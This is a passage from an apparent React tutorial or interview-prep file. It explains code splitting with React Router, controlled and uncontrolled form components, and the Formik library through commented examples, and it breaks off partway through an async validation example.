const Checkout = lazy(() => import('./pages/Shop/Checkout'));

function App() {
  return (
    <Layout>
      <Suspense fallback={<PageLoader />}>
        <Routes>
          {/* Public routes * /}
          <Route path="/" element={<Home />} />
          <Route path="/about" element={<About />} />
          <Route path="/contact" element={<Contact />} />
          
          {/* Dashboard routes * /}
          <Route path="/dashboard" element={
            <ProtectedRoute>
              <Dashboard />
            </ProtectedRoute>
          }>
            <Route index element={
              <Suspense fallback={<SectionLoader />}>
                <DashboardHome />
              </Suspense>
            } />
            <Route path="analytics" element={
              <Suspense fallback={<SectionLoader />}>
                <Analytics />
              </Suspense>
            } />
            <Route path="reports" element={
              <Suspense fallback={<SectionLoader />}>
                <Reports />
              </Suspense>
            } />
          </Route>
          
          {/* Admin routes * /}
          <Route path="/admin" element={
            <ProtectedRoute allowedRoles={['admin']}>
              <Admin />
            </ProtectedRoute>
          }>
            <Route path="users" element={
              <Suspense fallback={<SectionLoader />}>
                <Users />
              </Suspense>
            } />
            <Route path="settings" element={
              <Suspense fallback={<SectionLoader />}>
                <Settings />
              </Suspense>
            } />
          </Route>
          
          {/* Shop routes * /}
          <Route path="/shop" element={<Shop />}>
            <Route index element={
              <Suspense fallback={<SectionLoader />}>
                <ProductList />
              </Suspense>
            } />
            <Route path=":id" element={
              <Suspense fallback={<SectionLoader />}>
                <ProductDetail />
              </Suspense>
            } />
            <Route path="cart" element={
              <Suspense fallback={<SectionLoader />}>
                <Cart />
              </Suspense>
            } />
            <Route path="checkout" element={
              <Suspense fallback={<SectionLoader />}>
                <Checkout />
              </Suspense>
            } />
          </Route>
          
          {/* 404 * /}
          <Route path="*" element={<NotFound />} />
        </Routes>
      </Suspense>
    </Layout>
  );
}

Performance Metrics:
--------------------

Without code splitting:
- Initial bundle: 800KB
- First load: 3.5s
- Time to Interactive: 4.2s

With code splitting:
- Initial bundle: 150KB (main app + home page)
- First load: 0.8s
- Time to Interactive: 1.2s
- Subsequent pages: Load on demand (200-300ms each)

Best Practices:
---------------

1. Split by route (most common)
2. Split large features/sections
3. Don't over-split (too many chunks is bad)
4. Keep critical code in main bundle
5. Preload likely next routes
6. Use Error Boundaries
7. Meaningful loading states
8. Monitor chunk sizes

When to Code Split:
-------------------

✅ Large routes/pages (>100KB)
✅ Admin panels (not all users access)
✅ Dashboards with heavy visualizations
✅ E-commerce checkout flows
✅ Feature-rich pages with third-party libs
✅ Modals/dialogs with heavy content

When NOT to:
❌ Small components (<10KB)
❌ Critical above-the-fold content
❌ Shared components used everywhere
❌ Already small bundles (<200KB total)

Webpack Magic Comments:
------------------------

// Chunk naming
const Dashboard = lazy(() => import(
  /* webpackChunkName: "dashboard" * /
  './pages/Dashboard'
));

// Prefetch (load in idle time)
const Dashboard = lazy(() => import(
  /* webpackPrefetch: true * /
  './pages/Dashboard'
));

// Preload (load immediately with parent)
const Dashboard = lazy(() => import(
  /* webpackPreload: true * /
  './pages/Dashboard'
));

Summary:

Code Splitting in React Router:
- Use lazy() and Suspense
- Split by route for best results
- Reduces initial bundle size
- Improves load time
- Routes loaded on-demand
- Multiple Suspense boundaries
- Error boundaries for failures
- Preload next likely routes
- Essential for large apps
- Webpack handles chunking
- Monitor and optimize chunk sizes
*/




/**
59. What are controlled components?
-----------------------------------

A controlled component is a form element whose value is controlled by React state.
The component's value is always driven by React state, making React the "single source
of truth" for the form data.

Characteristics:
- Value stored in React state
- onChange handler updates state
- Value prop receives state
- React controls the input value
- Predictable and testable

Basic Controlled Component:
----------------------------

import { useState } from 'react';

function ControlledInput() {
  const [value, setValue] = useState('');
  
  return (
    <div>
      <input
        type="text"
        value={value}  // ← Controlled by state
        onChange={(e) => setValue(e.target.value)}  // ← Updates state
      />
      <p>Current value: {value}</p>
    </div>
  );
}

// Flow:
// 1. User types in input
// 2. onChange fires
// 3. setState updates React state
// 4. Component re-renders
// 5. Input displays new state value

Different Input Types:
----------------------

function ControlledForm() {
  const [formData, setFormData] = useState({
    // Text input
    username: '',
    
    // Email input
    email: '',
    
    // Password input
    password: '',
    
    // Number input
    age: '',
    
    // Textarea
    bio: '',
    
    // Checkbox
    agreeToTerms: false,
    
    // Radio buttons
    gender: '',
    
    // Select dropdown
    country: '',
    
    // Multi-select
    interests: []
  });
  
  // Generic change handler
  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
  };
  
  // Multi-select handler
  const handleMultiSelect = (e) => {
    const options = e.target.options;
    const selected = [];
    
    for (let i = 0; i < options.length; i++) {
      if (options[i].selected) {
        selected.push(options[i].value);
      }
    }
    
    setFormData(prev => ({ ...prev, interests: selected }));
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    console.log('Form data:', formData);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      {/* Text Input * /}
      <input
        type="text"
        name="username"
        value={formData.username}
        onChange={handleChange}
        placeholder="Username"
      />
      
      {/* Email Input * /}
      <input
        type="email"
        name="email"
        value={formData.email}
        onChange={handleChange}
        placeholder="Email"
      />
      
      {/* Password Input * /}
      <input
        type="password"
        name="password"
        value={formData.password}
        onChange={handleChange}
        placeholder="Password"
      />
      
      {/* Number Input * /}
      <input
        type="number"
        name="age"
        value={formData.age}
        onChange={handleChange}
        placeholder="Age"
      />
      
      {/* Textarea * /}
      <textarea
        name="bio"
        value={formData.bio}
        onChange={handleChange}
        placeholder="Bio"
      />
      
      {/* Checkbox * /}
      <label>
        <input
          type="checkbox"
          name="agreeToTerms"
          checked={formData.agreeToTerms}
          onChange={handleChange}
        />
        I agree to terms
      </label>
      
      {/* Radio Buttons * /}
      <label>
        <input
          type="radio"
          name="gender"
          value="male"
          checked={formData.gender === 'male'}
          onChange={handleChange}
        />
        Male
      </label>
      <label>
        <input
          type="radio"
          name="gender"
          value="female"
          checked={formData.gender === 'female'}
          onChange={handleChange}
        />
        Female
      </label>
      
      {/* Select Dropdown * /}
      <select
        name="country"
        value={formData.country}
        onChange={handleChange}
      >
        <option value="">Select Country</option>
        <option value="us">United States</option>
        <option value="uk">United Kingdom</option>
        <option value="ca">Canada</option>
      </select>
      
      {/* Multi-Select * /}
      <select
        name="interests"
        multiple
        value={formData.interests}
        onChange={handleMultiSelect}
      >
        <option value="sports">Sports</option>
        <option value="music">Music</option>
        <option value="reading">Reading</option>
        <option value="travel">Travel</option>
      </select>
      
      <button type="submit">Submit</button>
    </form>
  );
}

Benefits of Controlled Components:
-----------------------------------

// 1. Instant Validation
function EmailInput() {
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');
  
  const handleChange = (e) => {
    const value = e.target.value;
    setEmail(value);
    
    // Validate on every keystroke
    if (!value.includes('@')) {
      setError('Invalid email');
    } else {
      setError('');
    }
  };
  
  return (
    <div>
      <input value={email} onChange={handleChange} />
      {error && <span className="error">{error}</span>}
    </div>
  );
}

// 2. Input Formatting
function PhoneInput() {
  const [phone, setPhone] = useState('');
  
  const handleChange = (e) => {
    let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
    
    // Format: (123) 456-7890
    if (value.length > 3 && value.length <= 6) {
      value = `(${value.slice(0, 3)}) ${value.slice(3)}`;
    } else if (value.length > 6) {
      value = `(${value.slice(0, 3)}) ${value.slice(3, 6)}-${value.slice(6, 10)}`;
    }
    
    setPhone(value);
  };
  
  return <input value={phone} onChange={handleChange} />;
}

// 3. Uppercase Transformation
function UsernameInput() {
  const [username, setUsername] = useState('');
  
  const handleChange = (e) => {
    setUsername(e.target.value.toUpperCase()); // Force uppercase
  };
  
  return <input value={username} onChange={handleChange} />;
}

// 4. Character Limit
function BioInput() {
  const [bio, setBio] = useState('');
  const maxLength = 200;
  
  const handleChange = (e) => {
    const value = e.target.value;
    if (value.length <= maxLength) {
      setBio(value);
    }
  };
  
  return (
    <div>
      <textarea value={bio} onChange={handleChange} />
      <p>{bio.length} / {maxLength}</p>
    </div>
  );
}

// 5. Conditional Fields
function RegistrationForm() {
  const [userType, setUserType] = useState('personal');
  const [companyName, setCompanyName] = useState('');
  const [firstName, setFirstName] = useState('');
  
  return (
    <form>
      <select value={userType} onChange={e => setUserType(e.target.value)}>
        <option value="personal">Personal</option>
        <option value="business">Business</option>
      </select>
      
      {userType === 'business' && (
        <input
          value={companyName}
          onChange={e => setCompanyName(e.target.value)}
          placeholder="Company Name"
        />
      )}
      
      <input
        value={firstName}
        onChange={e => setFirstName(e.target.value)}
        placeholder="First Name"
      />
    </form>
  );
}

Complex Form Example:
---------------------

function UserRegistrationForm() {
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    password: '',
    confirmPassword: '',
    age: '',
    agreeToTerms: false
  });
  
  const [errors, setErrors] = useState({});
  const [touched, setTouched] = useState({});
  
  // Validation rules
  const validate = () => {
    const newErrors = {};
    
    if (!formData.username) {
      newErrors.username = 'Username is required';
    } else if (formData.username.length < 3) {
      newErrors.username = 'Username must be at least 3 characters';
    }
    
    if (!formData.email) {
      newErrors.email = 'Email is required';
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      newErrors.email = 'Email is invalid';
    }
    
    if (!formData.password) {
      newErrors.password = 'Password is required';
    } else if (formData.password.length < 8) {
      newErrors.password = 'Password must be at least 8 characters';
    }
    
    if (formData.password !== formData.confirmPassword) {
      newErrors.confirmPassword = 'Passwords do not match';
    }
    
    if (formData.age && formData.age < 18) {
      newErrors.age = 'Must be 18 or older';
    }
    
    if (!formData.agreeToTerms) {
      newErrors.agreeToTerms = 'You must agree to terms';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };
  
  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
    
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
  };
  
  const handleBlur = (e) => {
    const { name } = e.target;
    setTouched(prev => ({ ...prev, [name]: true }));
    validate();
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Mark all fields as touched
    const allTouched = Object.keys(formData).reduce((acc, key) => {
      acc[key] = true;
      return acc;
    }, {});
    setTouched(allTouched);
    
    if (validate()) {
      console.log('Form submitted:', formData);
      // Submit to API
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <div>
        <input
          type="text"
          name="username"
          value={formData.username}
          onChange={handleChange}
          onBlur={handleBlur}
          placeholder="Username"
        />
        {touched.username && errors.username && (
          <span className="error">{errors.username}</span>
        )}
      </div>
      
      <div>
        <input
          type="email"
          name="email"
          value={formData.email}
          onChange={handleChange}
          onBlur={handleBlur}
          placeholder="Email"
        />
        {touched.email && errors.email && (
          <span className="error">{errors.email}</span>
        )}
      </div>
      
      <div>
        <input
          type="password"
          name="password"
          value={formData.password}
          onChange={handleChange}
          onBlur={handleBlur}
          placeholder="Password"
        />
        {touched.password && errors.password && (
          <span className="error">{errors.password}</span>
        )}
      </div>
      
      <div>
        <input
          type="password"
          name="confirmPassword"
          value={formData.confirmPassword}
          onChange={handleChange}
          onBlur={handleBlur}
          placeholder="Confirm Password"
        />
        {touched.confirmPassword && errors.confirmPassword && (
          <span className="error">{errors.confirmPassword}</span>
        )}
      </div>
      
      <div>
        <input
          type="number"
          name="age"
          value={formData.age}
          onChange={handleChange}
          onBlur={handleBlur}
          placeholder="Age"
        />
        {touched.age && errors.age && (
          <span className="error">{errors.age}</span>
        )}
      </div>
      
      <div>
        <label>
          <input
            type="checkbox"
            name="agreeToTerms"
            checked={formData.agreeToTerms}
            onChange={handleChange}
          />
          I agree to terms and conditions
        </label>
        {touched.agreeToTerms && errors.agreeToTerms && (
          <span className="error">{errors.agreeToTerms}</span>
        )}
      </div>
      
      <button type="submit">Register</button>
    </form>
  );
}

Custom Controlled Input Hook:
------------------------------

function useInput(initialValue = '') {
  const [value, setValue] = useState(initialValue);
  
  const handleChange = (e) => {
    setValue(e.target.value);
  };
  
  const reset = () => {
    setValue(initialValue);
  };
  
  return {
    value,
    onChange: handleChange,
    reset
  };
}

// Usage
function LoginForm() {
  const email = useInput('');
  const password = useInput('');
  
  const handleSubmit = (e) => {
    e.preventDefault();
    console.log('Login:', email.value, password.value);
    email.reset();
    password.reset();
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input type="email" {...email} placeholder="Email" />
      <input type="password" {...password} placeholder="Password" />
      <button type="submit">Login</button>
    </form>
  );
}

When to Use Controlled Components:
-----------------------------------

✅ Need instant validation
✅ Format input (phone numbers, credit cards)
✅ Transform input (uppercase, trim)
✅ Enforce input constraints (max length, patterns)
✅ Conditional fields based on other inputs
✅ Dynamic forms
✅ Multi-step forms
✅ Need to disable submit until valid
✅ Need to clear/reset form programmatically

Common Mistakes:
----------------

// ❌ Mistake 1: Not providing onChange
<input value={value} />
// Input becomes read-only!

// ✅ Fix: Always provide onChange
<input value={value} onChange={e => setValue(e.target.value)} />

// ❌ Mistake 2: Undefined initial value
const [value, setValue] = useState();
<input value={value} onChange={e => setValue(e.target.value)} />
// Warning: changing from uncontrolled to controlled

// ✅ Fix: Initialize with empty string
const [value, setValue] = useState('');

// ❌ Mistake 3: Wrong event target for checkbox
<input
  type="checkbox"
  checked={checked}
  onChange={e => setChecked(e.target.value)} // Wrong!
/>

// ✅ Fix: Use e.target.checked
<input
  type="checkbox"
  checked={checked}
  onChange={e => setChecked(e.target.checked)}
/>

Summary:

Controlled Components:
- React state is single source of truth
- Value prop tied to state
- onChange updates state
- Component re-renders with new value
- Full control over input behavior
- Instant validation possible
- Can format/transform input
- More React-like approach
- Recommended for most cases
*/


/**
60. What are uncontrolled components?
-------------------------------------

An uncontrolled component is a form element that maintains its own internal state
in the DOM, like traditional HTML form elements. You access values using refs instead
of state.

Characteristics:
- DOM is the source of truth
- No value prop (use defaultValue)
- Access value via ref.current.value
- Less code, simpler
- Values read when needed (on submit)

Basic Uncontrolled Component:
------------------------------

import { useRef } from 'react';

function UncontrolledInput() {
  const inputRef = useRef();
  
  const handleSubmit = () => {
    // Read value from DOM when needed
    console.log('Value:', inputRef.current.value);
  };
  
  return (
    <div>
      <input
        ref={inputRef}
        type="text"
        defaultValue="Initial value"  // Not value!
      />
      <button onClick={handleSubmit}>Submit</button>
    </div>
  );
}

// Flow:
// 1. User types in input
// 2. DOM maintains value internally
// 3. On submit, read value from ref
// 4. No component re-renders during typing

Complete Uncontrolled Form:
----------------------------

function UncontrolledForm() {
  const usernameRef = useRef();
  const emailRef = useRef();
  const passwordRef = useRef();
  const ageRef = useRef();
  const bioRef = useRef();
  const agreeRef = useRef();
  const genderRef = useRef();
  const countryRef = useRef();
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Read all values from DOM
    const formData = {
      username: usernameRef.current.value,
      email: emailRef.current.value,
      password: passwordRef.current.value,
      age: ageRef.current.value,
      bio: bioRef.current.value,
      agreeToTerms: agreeRef.current.checked,
      gender: genderRef.current.value,
      country: countryRef.current.value
    };
    
    console.log('Form data:', formData);
    
    // Validate
    if (!formData.username) {
      alert('Username is required');
      return;
    }
    
    // Submit to API
    submitForm(formData);
  };
  
  const handleReset = () => {
    // Reset using form.reset()
    document.getElementById('myForm').reset();
  };
  
  return (
    <form id="myForm" onSubmit={handleSubmit}>
      {/* Text Input * /}
      <input
        ref={usernameRef}
        type="text"
        name="username"
        defaultValue=""
        placeholder="Username"
      />
      
      {/* Email Input * /}
      <input
        ref={emailRef}
        type="email"
        name="email"
        defaultValue=""
        placeholder="Email"
      />
      
      {/* Password Input * /}
      <input
        ref={passwordRef}
        type="password"
        name="password"
        defaultValue=""
        placeholder="Password"
      />
      
      {/* Number Input * /}
      <input
        ref={ageRef}
        type="number"
        name="age"
        defaultValue=""
        placeholder="Age"
      />
      
      {/* Textarea * /}
      <textarea
        ref={bioRef}
        name="bio"
        defaultValue=""
        placeholder="Bio"
      />
      
      {/* Checkbox * /}
      <label>
        <input
          ref={agreeRef}
          type="checkbox"
          name="agreeToTerms"
          defaultChecked={false}
        />
        I agree to terms
      </label>
      
      {/* Radio Buttons * /}
      <label>
        <input
          ref={genderRef}
          type="radio"
          name="gender"
          value="male"
          defaultChecked
        />
        Male
      </label>
      <label>
        <input
          type="radio"
          name="gender"
          value="female"
        />
        Female
      </label>
      
      {/* Select * /}
      <select ref={countryRef} name="country" defaultValue="">
        <option value="">Select Country</option>
        <option value="us">United States</option>
        <option value="uk">United Kingdom</option>
      </select>
      
      <button type="submit">Submit</button>
      <button type="button" onClick={handleReset}>Reset</button>
    </form>
  );
}

File Input (Always Uncontrolled):
----------------------------------

function FileUpload() {
  const fileRef = useRef();
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Access file from DOM
    const file = fileRef.current.files[0];
    
    if (!file) {
      alert('Please select a file');
      return;
    }
    
    console.log('File:', file.name, file.size, file.type);
    
    // Upload file
    const formData = new FormData();
    formData.append('file', file);
    
    uploadFile(formData);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      {/* File inputs are ALWAYS uncontrolled * /}
      <input
        ref={fileRef}
        type="file"
        accept="image/*"
      />
      <button type="submit">Upload</button>
    </form>
  );
}

Using FormData API:
-------------------

function UncontrolledFormWithFormData() {
  const formRef = useRef();
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Get all form data automatically
    const formData = new FormData(formRef.current);
    
    // Convert to object
    const data = Object.fromEntries(formData);
    
    console.log('Form data:', data);
    
    // Or iterate
    for (let [key, value] of formData.entries()) {
      console.log(`${key}: ${value}`);
    }
    
    // Submit
    fetch('/api/submit', {
      method: 'POST',
      body: formData
    });
  };
  
  return (
    <form ref={formRef} onSubmit={handleSubmit}>
      <input name="username" defaultValue="" />
      <input name="email" type="email" defaultValue="" />
      <textarea name="message" defaultValue="" />
      <button type="submit">Submit</button>
    </form>
  );
}

Reading Values Imperatively:
-----------------------------

function UncontrolledWithActions() {
  const inputRef = useRef();
  
  const getValue = () => {
    alert(`Current value: ${inputRef.current.value}`);
  };
  
  const setValue = () => {
    inputRef.current.value = 'New value';
  };
  
  const clearValue = () => {
    inputRef.current.value = '';
  };
  
  const focusInput = () => {
    inputRef.current.focus();
  };
  
  return (
    <div>
      <input ref={inputRef} defaultValue="Initial" />
      
      <button onClick={getValue}>Get Value</button>
      <button onClick={setValue}>Set Value</button>
      <button onClick={clearValue}>Clear</button>
      <button onClick={focusInput}>Focus</button>
    </div>
  );
}

Validation with Uncontrolled:
------------------------------

function UncontrolledWithValidation() {
  const emailRef = useRef();
  const [error, setError] = useState('');
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    const email = emailRef.current.value;
    
    // Validate on submit
    if (!email) {
      setError('Email is required');
      return;
    }
    
    if (!email.includes('@')) {
      setError('Invalid email format');
      return;
    }
    
    setError('');
    console.log('Email:', email);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        ref={emailRef}
        type="email"
        defaultValue=""
        placeholder="Email"
      />
      {error && <span className="error">{error}</span>}
      <button type="submit">Submit</button>
    </form>
  );
}

HTML5 Validation:
-----------------

function UncontrolledWithHTML5Validation() {
  const formRef = useRef();
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Check if form is valid
    if (!formRef.current.checkValidity()) {
      // Browser will show validation messages
      return;
    }
    
    const formData = new FormData(formRef.current);
    console.log('Valid form data:', Object.fromEntries(formData));
  };
  
  return (
    <form ref={formRef} onSubmit={handleSubmit}>
      <input
        name="username"
        required
        minLength={3}
        placeholder="Username (min 3 chars)"
      />
      
      <input
        name="email"
        type="email"
        required
        placeholder="Email"
      />
      
      <input
        name="age"
        type="number"
        min={18}
        max={100}
        placeholder="Age (18-100)"
      />
      
      <input
        name="website"
        type="url"
        placeholder="Website URL"
      />
      
      <button type="submit">Submit</button>
    </form>
  );
}

Hybrid Approach:
----------------

// Use uncontrolled for most fields, controlled for specific ones
function HybridForm() {
  const formRef = useRef();
  const [username, setUsername] = useState('');  // Controlled for validation
  
  const handleUsernameChange = (e) => {
    // Transform to lowercase
    setUsername(e.target.value.toLowerCase());
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Get uncontrolled values
    const formData = new FormData(formRef.current);
    const data = Object.fromEntries(formData);
    
    // Combine with controlled value
    data.username = username;
    
    console.log('Form data:', data);
  };
  
  return (
    <form ref={formRef} onSubmit={handleSubmit}>
      {/* Controlled (need transformation) * /}
      <input
        name="username"
        value={username}
        onChange={handleUsernameChange}
        placeholder="Username (lowercase)"
      />
      
      {/* Uncontrolled (simple fields) * /}
      <input name="email" type="email" defaultValue="" />
      <input name="password" type="password" defaultValue="" />
      <textarea name="bio" defaultValue="" />
      
      <button type="submit">Submit</button>
    </form>
  );
}

When to Use Uncontrolled Components:
-------------------------------------

✅ Simple forms (contact, login)
✅ Integrating with non-React libraries
✅ File uploads (always uncontrolled)
✅ Don't need instant validation
✅ Don't need to transform input
✅ Form with many fields (performance)
✅ Quick prototypes
✅ HTML5 validation sufficient

When NOT to Use:
----------------

❌ Need instant validation
❌ Need to format/transform input
❌ Conditional fields based on input
❌ Dynamic forms
❌ Need to disable submit until valid
❌ Multi-step forms
❌ Need to enforce input patterns

Controlled vs Uncontrolled Comparison:
---------------------------------------

// Controlled
function ControlledExample() {
  const [value, setValue] = useState('');
  
  return (
    <input
      value={value}
      onChange={e => setValue(e.target.value)}
    />
  );
}

// Uncontrolled
function UncontrolledExample() {
  const inputRef = useRef();
  
  return <input ref={inputRef} defaultValue="" />;
}

// Controlled: More code, more control
// Uncontrolled: Less code, less control

Performance Comparison:
-----------------------

// Controlled: Re-renders on every keystroke
function ControlledPerformance() {
  const [value, setValue] = useState('');
  
  console.log('Render');  // Logs on every keystroke
  
  return <input value={value} onChange={e => setValue(e.target.value)} />;
}

// Uncontrolled: No re-renders during typing
function UncontrolledPerformance() {
  const inputRef = useRef();
  
  console.log('Render');  // Only logs on mount
  
  return <input ref={inputRef} defaultValue="" />;
}

Common Patterns:
----------------

// Pattern 1: Quick form with FormData
function QuickForm() {
  const handleSubmit = (e) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(e.target));
    submitToAPI(data);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input name="name" />
      <input name="email" type="email" />
      <button type="submit">Submit</button>
    </form>
  );
}

// Pattern 2: Focus management
function FocusExample() {
  const firstInputRef = useRef();
  
  useEffect(() => {
    firstInputRef.current.focus();
  }, []);
  
  return <input ref={firstInputRef} defaultValue="" />;
}

// Pattern 3: Clear form
function ClearForm() {
  const formRef = useRef();
  
  const handleClear = () => {
    formRef.current.reset();
  };
  
  return (
    <form ref={formRef}>
      <input name="field1" />
      <input name="field2" />
      <button type="button" onClick={handleClear}>Clear</button>
    </form>
  );
}

Common Mistakes:
----------------

// ❌ Mistake 1: Using value instead of defaultValue
<input ref={inputRef} value="" />
// Creates controlled component!

// ✅ Fix: Use defaultValue
<input ref={inputRef} defaultValue="" />

// ❌ Mistake 2: Switching between controlled and uncontrolled
const [value, setValue] = useState();
<input value={value} onChange={e => setValue(e.target.value)} />
// value is undefined initially

// ✅ Fix: Always initialize with string or use uncontrolled
const [value, setValue] = useState('');

// ❌ Mistake 3: Not preventing default on submit
const handleSubmit = () => {
  const value = inputRef.current.value;
  // Form submits and page refreshes!
};

// ✅ Fix: Prevent default
const handleSubmit = (e) => {
  e.preventDefault();
  const value = inputRef.current.value;
};

Summary:

Uncontrolled Components:
- DOM maintains state
- Access via refs
- Use defaultValue (not value)
- Read values when needed
- Less code, simpler
- Better performance (no re-renders)
- File inputs always uncontrolled
- Good for simple forms
- Use controlled for complex scenarios
*/


/**
61. What is useFormik or Formik library?
----------------------------------------

Formik is a popular library for building forms in React. It handles form state,
validation, error messages, and submission, reducing boilerplate and making forms
easier to manage.

Purpose:
- Simplify form state management
- Built-in validation support
- Error handling
- Touch tracking
- Form submission
- Reduce boilerplate code

Installation:
-------------

npm install formik

Basic useFormik Hook:
---------------------

import { useFormik } from 'formik';

function LoginForm() {
  const formik = useFormik({
    initialValues: {
      email: '',
      password: ''
    },
    onSubmit: (values) => {
      console.log('Form submitted:', values);
      // Submit to API
      loginAPI(values);
    }
  });
  
  return (
    <form onSubmit={formik.handleSubmit}>
      <input
        type="email"
        name="email"
        value={formik.values.email}
        onChange={formik.handleChange}
        onBlur={formik.handleBlur}
      />
      
      <input
        type="password"
        name="password"
        value={formik.values.password}
        onChange={formik.handleChange}
        onBlur={formik.handleBlur}
      />
      
      <button type="submit">Login</button>
    </form>
  );
}

With Validation:
----------------

import { useFormik } from 'formik';

function RegistrationForm() {
  const formik = useFormik({
    initialValues: {
      username: '',
      email: '',
      password: '',
      confirmPassword: ''
    },
    
    // Validation function
    validate: (values) => {
      const errors = {};
      
      if (!values.username) {
        errors.username = 'Required';
      } else if (values.username.length < 3) {
        errors.username = 'Must be at least 3 characters';
      }
      
      if (!values.email) {
        errors.email = 'Required';
      } else if (!/^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i.test(values.email)) {
        errors.email = 'Invalid email address';
      }
      
      if (!values.password) {
        errors.password = 'Required';
      } else if (values.password.length < 8) {
        errors.password = 'Must be at least 8 characters';
      }
      
      if (values.password !== values.confirmPassword) {
        errors.confirmPassword = 'Passwords must match';
      }
      
      return errors;
    },
    
    onSubmit: (values) => {
      console.log('Registration:', values);
      registerAPI(values);
    }
  });
  
  return (
    <form onSubmit={formik.handleSubmit}>
      <div>
        <input
          type="text"
          name="username"
          value={formik.values.username}
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          placeholder="Username"
        />
        {formik.touched.username && formik.errors.username && (
          <div className="error">{formik.errors.username}</div>
        )}
      </div>
      
      <div>
        <input
          type="email"
          name="email"
          value={formik.values.email}
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          placeholder="Email"
        />
        {formik.touched.email && formik.errors.email && (
          <div className="error">{formik.errors.email}</div>
        )}
      </div>
      
      <div>
        <input
          type="password"
          name="password"
          value={formik.values.password}
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          placeholder="Password"
        />
        {formik.touched.password && formik.errors.password && (
          <div className="error">{formik.errors.password}</div>
        )}
      </div>
      
      <div>
        <input
          type="password"
          name="confirmPassword"
          value={formik.values.confirmPassword}
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          placeholder="Confirm Password"
        />
        {formik.touched.confirmPassword && formik.errors.confirmPassword && (
          <div className="error">{formik.errors.confirmPassword}</div>
        )}
      </div>
      
      <button type="submit" disabled={formik.isSubmitting}>
        Register
      </button>
    </form>
  );
}

getFieldProps Helper:
---------------------

// Simplify field props with getFieldProps
function SimpleForm() {
  const formik = useFormik({
    initialValues: { email: '', password: '' },
    onSubmit: values => console.log(values)
  });
  
  return (
    <form onSubmit={formik.handleSubmit}>
      {/* Instead of manually adding value, onChange, onBlur * /}
      <input
        type="email"
        {...formik.getFieldProps('email')}
        placeholder="Email"
      />
      
      <input
        type="password"
        {...formik.getFieldProps('password')}
        placeholder="Password"
      />
      
      <button type="submit">Submit</button>
    </form>
  );
}

// getFieldProps returns:
// {
//   name: 'email',
//   value: formik.values.email,
//   onChange: formik.handleChange,
//   onBlur: formik.handleBlur
// }

Formik Component (Alternative API):
------------------------------------

import { Formik, Form, Field, ErrorMessage } from 'formik';

function FormikComponentExample() {
  return (
    <Formik
      initialValues={{ email: '', password: '' }}
      validate={values => {
        const errors = {};
        if (!values.email) {
          errors.email = 'Required';
        }
        return errors;
      }}
      onSubmit={(values, { setSubmitting }) => {
        setTimeout(() => {
          console.log('Submitting:', values);
          setSubmitting(false);
        }, 1000);
      }}
    >
      {({ isSubmitting }) => (
        <Form>
          <div>
            <Field type="email" name="email" placeholder="Email" />
            <ErrorMessage name="email" component="div" className="error" />
          </div>
          
          <div>
            <Field type="password" name="password" placeholder="Password" />
            <ErrorMessage name="password" component="div" className="error" />
          </div>
          
          <button type="submit" disabled={isSubmitting}>
            Submit
          </button>
        </Form>
      )}
    </Formik>
  );
}

Custom Field Components:
------------------------

import { Field } from 'formik';

// Custom text input
function TextField({ label, ...props }) {
  return (
    <Field name={props.name}>
      {({ field, form, meta }) => (
        <div>
          <label>{label}</label>
          <input {...field} {...props} />
          {meta.touched && meta.error && (
            <div className="error">{meta.error}</div>
          )}
        </div>
      )}
    </Field>
  );
}

// Custom select
function SelectField({ label, options, ...props }) {
  return (
    <Field name={props.name}>
      {({ field, meta }) => (
        <div>
          <label>{label}</label>
          <select {...field} {...props}>
            {options.map(option => (
              <option key={option.value} value={option.value}>
                {option.label}
              </option>
            ))}
          </select>
          {meta.touched && meta.error && (
            <div className="error">{meta.error}</div>
          )}
        </div>
      )}
    </Field>
  );
}

// Custom checkbox
function CheckboxField({ label, ...props }) {
  return (
    <Field name={props.name} type="checkbox">
      {({ field, meta }) => (
        <div>
          <label>
            <input type="checkbox" {...field} {...props} />
            {label}
          </label>
          {meta.touched && meta.error && (
            <div className="error">{meta.error}</div>
          )}
        </div>
      )}
    </Field>
  );
}

// Usage
<Formik initialValues={{ name: '', country: '', agree: false }} onSubmit={handleSubmit}>
  <Form>
    <TextField label="Name" name="name" />
    <SelectField
      label="Country"
      name="country"
      options={[
        { value: 'us', label: 'United States' },
        { value: 'uk', label: 'United Kingdom' }
      ]}
    />
    <CheckboxField label="I agree to terms" name="agree" />
    <button type="submit">Submit</button>
  </Form>
</Formik>

Async Validation:
-----------------

function AsyncValidationForm() {
  const formik = useFormik({
    initialValues: { username: '' },
    
    validate: async (values) => {
      const errors = {};
      
      if (values.username) {
        // Check if username is taken
        const isTaken = await checkUsernameAvailability(values.username);
        if (isTaken) {
          errors.username = 'Username is already taken';
        }
      }
      
      return errors;
    },
    
    onSubmit: values => console.log(values)
  });
  
  return (
